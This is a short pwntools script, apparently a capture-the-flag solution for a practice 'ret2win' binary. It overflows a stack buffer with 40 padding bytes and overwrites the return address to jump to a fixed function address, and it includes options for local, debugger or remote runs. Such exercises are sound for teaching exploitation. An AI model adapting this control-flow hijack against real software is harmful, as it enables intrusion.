from pwn import *

elf = context.binary = ELF('./ret2win')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

#conn.send(cyclic(0x80))
conn.send(b'A'*40 + p64(0x400756))

conn.interactive()